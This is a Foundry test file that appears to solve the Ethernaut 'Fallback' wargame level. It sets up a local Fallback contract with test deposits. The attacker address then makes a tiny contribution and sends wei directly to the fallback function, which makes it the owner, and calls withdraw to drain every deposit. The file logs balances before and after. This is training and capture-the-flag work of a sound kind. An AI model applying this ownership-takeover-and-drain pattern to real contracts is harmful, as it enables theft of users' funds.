// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test , console} from "forge-std/Test.sol";

import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {

    Fallback fall;


    address payable attacker = payable(makeAddr("attacker"));

 function setUp() public {

    fall = new Fallback(); 


    vm.deal(attacker, 1 ether);

 }

    modifier addContribution (){

        for(uint160 i = 1 ; i < 10 ; i++ ){

            hoax(address(i), 1 ether);
            fall.contribute{value : 0.0001 ether}(); // all the player deposit 0.0001 ether
        
        }

    _;

    }

    function testWithdrowAlltheEther() public addContribution {


        console.log("before attack ");
        console.log("balance of Contract :" , address(fall).balance);
        console.log("balance of Attacker :" , attacker.balance);
   


        vm.startPrank(attacker);
        fall.contribute{value :1 wei }();
        (bool secc ,) = address(fall).call{value : 1 wei}("");

        // Check the  Owner

        console.log(" New Owner        :" , fall.owner());
        console.log(" Attacker address :" , attacker);
        

        // withdrow all Ether

        fall.withdraw();

        vm.stopPrank();


        console.log("After attack ");
        console.log("balance of Contract :" , address(fall).balance);
        console.log("balance of Attacker :" , attacker.balance);
        

    }

}

